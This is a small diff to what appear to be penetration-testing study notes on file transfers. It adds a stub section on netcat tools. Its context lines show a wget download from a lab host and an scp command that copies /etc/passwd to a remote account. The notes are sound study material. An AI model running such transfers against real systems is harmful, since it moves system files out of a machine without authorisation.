@@ -3,6 +3,7 @@
   - [Base64 Encoding / Decoding](#1-base64-encoding--decoding)
   - [Web Downloads](#2-web-downloads)
   - [SSH Downloads](#3-ssh-downloads)
+  - [nc tools](#4-nc-tools)
 - [Upload Operations](#upload-operations)
   - [Web Upload](#web-upload)
   - [Alternative Web File Transfer Method](#alternative-web-file-transfer-method)
@@ -118,3 +119,6 @@ wget 192.168.49.128:8000/filetotransfer.txt
 ```
 scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
 ```
+
+## nc tools
+the same as in download in reverse
